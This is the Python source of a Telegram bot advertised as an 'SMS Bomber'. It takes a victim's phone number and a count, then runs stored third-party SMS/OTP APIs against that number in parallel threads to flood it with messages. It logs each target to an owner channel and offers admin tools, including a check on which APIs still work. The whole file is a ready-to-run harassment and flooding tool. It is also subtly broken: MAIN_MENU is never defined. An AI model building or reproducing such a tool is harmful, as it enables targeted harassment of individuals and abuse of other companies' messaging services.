# bot.py
import os
import requests
import random
import string
import threading
import time
import json
from concurrent.futures import ThreadPoolExecutor
import logging
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove, BotCommand, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
)
import database

# --- Configuration ---
OWNER_ID = 1692540458
LOG_CHANNEL_ID = -1003053960610
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')

# --- Logging Setup ---
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# --- Helper Functions ---
def random_string_generator(pattern):
    result = ''
    parts = pattern.split(':')
    main_pattern = parts[0]
    params = parts[1] if len(parts) > 1 else ''

    if main_pattern == '?n*':
        length = int(params)
        return ''.join(random.choice(string.digits) for _ in range(length))
    if main_pattern == '?l*':
        length = int(params)
        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
    if main_pattern == '?i*':
        length = int(params)
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
    return ''

def format_json_template(template_str, number):
    template_str = template_str.replace("{number}", number)
    template_str = template_str.replace("{number_slice:1}", number[1:])
    
    while '{random_string:' in template_str:
        start = template_str.find('{random_string:')
        end = template_str.find('}', start)
        pattern = template_str[start+15:end]
        random_val = random_string_generator(pattern)
        template_str = template_str[:start] + random_val + template_str[end+1:]
        
    return json.loads(template_str)

# --- Bombing Logic ---
def send_dynamic_request(api_details, number):
    api_id, name, url, method, headers, data_template, is_active = api_details
    if not is_active: return None
    
    try:
        formatted_data = format_json_template(json.dumps(data_template), number)
        formatted_url = url.replace("{number}", number)
        
        if method.upper() == "POST":
            response = requests.post(formatted_url, headers=headers, json=formatted_data, timeout=10)
        else:
            response = requests.get(formatted_url, headers=headers, timeout=10)
        
        logger.info(f"API '{name}' responded with status {response.status_code}")
        return (name, response.status_code)
    except Exception as e:
        logger.error(f"API '{name}' failed: {e}")
        return (name, 'Failed')

def process_requests(number, amount, context: ContextTypes.DEFAULT_TYPE, chat_id: int):
    apis = database.get_all_apis()
    if not apis:
        context.bot.send_message(chat_id, text="❌ No APIs found in the database. Please contact the admin.")
        return

    total_success_count = 0
    for i in range(amount):
        with ThreadPoolExecutor(max_workers=15) as executor:
            futures = [executor.submit(send_dynamic_request, api, number) for api in apis]
            for future in futures:
                result = future.result()
                if result and isinstance(result[1], int) and result[1] < 300:
                    total_success_count += 1
        time.sleep(1)

    final_message = f"✅ SMS Bombing Completed.\nSuccessfully sent {total_success_count} requests to {number}."
    context.bot.send_message(chat_id, text=final_message)

# --- Handlers & Conversation States ---
ASK_NUMBER, ASK_AMOUNT, ADMIN_PANEL, BROADCAST_CONFIRM, ASK_USER_ID, MANAGE_APIS, REMOVE_API, ADD_API_NAME, ADD_API_URL, ADD_API_METHOD, ADD_API_HEADERS, ADD_API_DATA = range(12)

# --- Keyboards ---
main_keyboard = [["💣 Start Bombing"], ["📊 Statistics"]]
main_markup = ReplyKeyboardMarkup(main_keyboard, resize_keyboard=True)
admin_keyboard = [
    ["📢 Broadcast", "📈 User Stats"],
    ["🌡️ API Status", "⚙️ Manage APIs"],
    ["⬅️ Back to Main Menu"]
]
admin_markup = ReplyKeyboardMarkup(admin_keyboard, resize_keyboard=True)

# --- Utility Functions ---
def is_admin(update: Update) -> bool:
    return update.effective_user.id == OWNER_ID

async def send_log_message(context: ContextTypes.DEFAULT_TYPE, user, target_number: str, amount: int):
    user_link = f"<a href='tg://user?id={user.id}'>{user.first_name}</a>"
    username = f"(@{user.username})" if user.username else ""
    log_message = (
        f"<b>🚀 New Bombing Task</b>\n\n"
        f"👤 <b>User:</b> {user_link} {username}\n"
        f"🆔 <b>User ID:</b> <code>{user.id}</code>\n"
        f"🎯 <b>Target:</b> <code>{target_number}</code>\n"
        f"💥 <b>Amount:</b> <code>{amount}</code>"
    )
    try:
        await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=log_message, parse_mode='HTML')
    except Exception as e:
        logger.error(f"Failed to send log to channel: {e}")

# --- Main Handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user = update.effective_user
    database.add_or_update_user(user.id, user.first_name, user.username)
    credit_text = "This bot is made by <a href='https://t.me/abdur081'>Abdur Rahman</a>."
    await update.message.reply_html(rf"Hi {user.mention_html()}!")
    await update.message.reply_text(
        "Welcome to the SMS Bomber Bot!\n\n"
        f"{credit_text}\n\n"
        "Click a button below to start.",
        reply_markup=main_markup, parse_mode='HTML', disable_web_page_preview=True
    )
    return MAIN_MENU

async def stats_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    total_users, total_tasks = database.get_public_stats()
    message = (
        f"📊 **Bot Statistics**\n\n"
        f"👥 **Total Unique Users:** {total_users}\n"
        f"💥 **Total Bombing Tasks Initiated:** {total_tasks}"
    )
    await update.message.reply_text(message, parse_mode='HTML', reply_markup=main_markup)

# --- Bombing Conversation ---
async def ask_for_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("Please enter the target phone number (e.g., 017...):", reply_markup=ReplyKeyboardRemove())
    return ASK_NUMBER

async def ask_for_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    number = update.message.text
    if not (number.startswith("01") and len(number) == 11 and number.isdigit()):
        await update.message.reply_text("❌ Invalid number. Returning to main menu.", reply_markup=main_markup)
        return MAIN_MENU
    context.user_data['number'] = number
    await update.message.reply_text("Now, enter the amount (1-50):")
    return ASK_AMOUNT

async def start_bombing(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    try:
        amount = int(update.message.text)
        if not (1 <= amount <= 50): raise ValueError
    except (ValueError):
        await update.message.reply_text("❌ Invalid amount. Returning to main menu.", reply_markup=main_markup)
        return MAIN_MENU

    number = context.user_data['number']
    user = update.effective_user
    database.add_log(user.id, number, amount)
    await send_log_message(context, user, number, amount)
    await update.message.reply_text(f"⏳ SMS Bombing Started on {number}...", reply_markup=main_markup)
    threading.Thread(target=process_requests, args=(number, amount, context, update.message.chat_id)).start()
    return MAIN_MENU

# --- Admin Panel ---
async def admin_panel_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_admin(update):
        await update.message.reply_text("You are not authorized to use this command.")
        return MAIN_MENU
    await update.message.reply_text("Welcome to the Admin Panel.", reply_markup=admin_markup)
    return ADMIN_PANEL

async def back_to_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("Returning to the main menu.", reply_markup=main_markup)
    return MAIN_MENU

# --- Broadcast Feature ---
async def broadcast_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("Please send the message you want to broadcast to all users.")
    return BROADCAST_CONFIRM

async def broadcast_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['broadcast_message_id'] = update.message.message_id
    keyboard = [[InlineKeyboardButton("✅ Yes, Send", callback_data='broadcast_send'), InlineKeyboardButton("❌ No, Cancel", callback_data='broadcast_cancel')]]
    await update.message.reply_text("Are you sure you want to send this message to all users?", reply_markup=InlineKeyboardMarkup(keyboard))
    return ADMIN_PANEL

async def broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    if query.data == 'broadcast_send':
        await query.edit_message_text(text="Broadcasting... Please wait.")
        user_ids = database.get_all_user_ids()
        sent_count = 0
        failed_count = 0
        for user_id in user_ids:
            try:
                await context.bot.copy_message(chat_id=user_id, from_chat_id=query.message.chat_id, message_id=context.user_data['broadcast_message_id'])
                sent_count += 1
            except Exception:
                failed_count += 1
            time.sleep(0.1) # To avoid hitting rate limits
        await query.edit_message_text(text=f"Broadcast finished.\n\nSent: {sent_count}\nFailed: {failed_count}", reply_markup=admin_markup)
    else:
        await query.edit_message_text(text="Broadcast cancelled.", reply_markup=admin_markup)
    return ADMIN_PANEL

# --- User Stats Feature ---
async def user_stats_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("Please send the User ID to get their stats.")
    return ASK_USER_ID

async def user_stats_result(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    try:
        user_id = int(update.message.text)
        user_info, task_count = database.get_user_stats(user_id)
        if user_info:
            name, username = user_info
            message = (
                f"📊 **Stats for User ID:** `{user_id}`\n\n"
                f"👤 **Name:** {name}\n"
                f"🌐 **Username:** @{username if username else 'N/A'}\n"
                f"💥 **Total Tasks:** {task_count}"
            )
            await update.message.reply_text(message, parse_mode='HTML', reply_markup=admin_markup)
        else:
            await update.message.reply_text("User not found in the database.", reply_markup=admin_markup)
    except ValueError:
        await update.message.reply_text("Invalid User ID. Please send a number.", reply_markup=admin_markup)
    return ADMIN_PANEL

# --- API Status Feature ---
async def api_status_check(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    apis = database.get_all_apis()
    if not apis:
        await update.message.reply_text("No APIs in the database to check.", reply_markup=admin_markup)
        return ADMIN_PANEL
    
    msg = await update.message.reply_text("🌡️ Checking API status... Please wait.")
    
    results = []
    test_number = "01700000000" # A dummy number for testing
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(send_dynamic_request, api, test_number) for api in apis]
        for future in futures:
            results.append(future.result())
            
    status_text = "<b>🌡️ API Health Status:</b>\n\n"
    for name, status_code in results:
        if isinstance(status_code, int) and status_code < 400:
            status_text += f"✅ {name}: Working (Status: {status_code})\n"
        else:
            status_text += f"❌ {name}: Failed (Status: {status_code})\n"
            
    await msg.edit_text(status_text, parse_mode='HTML')
    return ADMIN_PANEL

# --- General Cancel ---
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("Operation cancelled. Returning to main menu.", reply_markup=main_markup)
    context.user_data.clear()
    return MAIN_MENU

# --- Bot Setup ---
async def post_init(application: Application) -> None:
    await application.bot.set_my_commands([
        BotCommand("start", "Restart the bot"),
        BotCommand("stats", "View bot statistics"),
        BotCommand("admin", "Access Admin Panel (Owner only)")
    ])

def main() -> None:
    database.setup_database()
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).post_init(post_init).build()

    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("start", start),
            MessageHandler(filters.Regex('^💣 Start Bombing$'), ask_for_number),
            MessageHandler(filters.Regex('^📊 Statistics$'), stats_handler),
            CommandHandler("admin", admin_panel_handler),
            MessageHandler(filters.Regex('^⬅️ Back to Main Menu$'), back_to_main_menu)
        ],
        states={
            MAIN_MENU: [
                MessageHandler(filters.Regex('^💣 Start Bombing$'), ask_for_number),
                MessageHandler(filters.Regex('^📊 Statistics$'), stats_handler),
                CommandHandler("admin", admin_panel_handler)
            ],
            ASK_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_for_amount)],
            ASK_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, start_bombing)],
            ADMIN_PANEL: [
                MessageHandler(filters.Regex('^📢 Broadcast$'), broadcast_start),
                MessageHandler(filters.Regex('^📈 User Stats$'), user_stats_start),
                MessageHandler(filters.Regex('^🌡️ API Status$'), api_status_check),
                MessageHandler(filters.Regex('^⬅️ Back to Main Menu$'), back_to_main_menu),
                CallbackQueryHandler(broadcast_callback)
            ],
            BROADCAST_CONFIRM: [MessageHandler(filters.ALL, broadcast_confirm)],
            ASK_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, user_stats_result)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    
    application.add_handler(conv_handler)
    application.run_polling()

if __name__ == "__main__":
    main()